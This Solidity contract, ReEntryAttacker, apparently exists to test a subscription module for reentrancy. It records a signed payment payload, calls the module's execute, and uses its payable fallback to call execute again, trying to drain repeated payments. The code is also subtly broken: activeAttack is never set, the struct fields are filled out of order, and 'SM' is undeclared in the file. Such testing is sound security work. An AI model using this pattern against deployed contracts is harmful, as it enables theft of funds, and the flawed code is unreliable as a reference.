pragma solidity ^0.5.0;

import "./common/GEnum.sol";
import "./modules/interfaces/SubscriptionModule.sol";

contract ReEntryAttacker {

    struct Payload {
        address to;
        uint256 value;
        bytes data;
        GEnum.Period period;
        uint256 unique;
        uint256 startDate;
        uint256 endDate;
        bytes signatures;
    }

    address payable subModule;

    bytes32 activeAttack;

    mapping(bytes32 => Payload) public payloads;

    constructor(
        address payable _subModuleAddr
    )
    public
    {
        subModule = _subModuleAddr;
    }

    function attack(
        address payable to,
        uint256 value,
        bytes memory data,
        GEnum.Period period,
        uint256 startDate,
        uint256 endDate,
        uint256 unique,
        bytes memory signatures
    )
    public
    {
        bytes32 _activeAttack = SM(subModule)
        .getHash(
            to,
            value,
            data,
            period,
            startDate,
            endDate,
            unique
        );

        payloads[_activeAttack] = Payload(
            to,
            value,
            data,
            period,
            startDate,
            endDate,
            unique,
            signatures
        );

        SM(subModule)
        .execute(
            to,
            value,
            data,
            period,
            startDate,
            endDate,
            unique,
            signatures
        );
    }

    function()
    external
    payable {

        Payload storage _attack = payloads[activeAttack];

        SM(subModule)
        .execute(
            _attack.to,
            _attack.value,
            _attack.data,
            _attack.period,
            _attack.startDate,
            _attack.endDate,
            _attack.unique,
            _attack.signatures
        );
    }
}
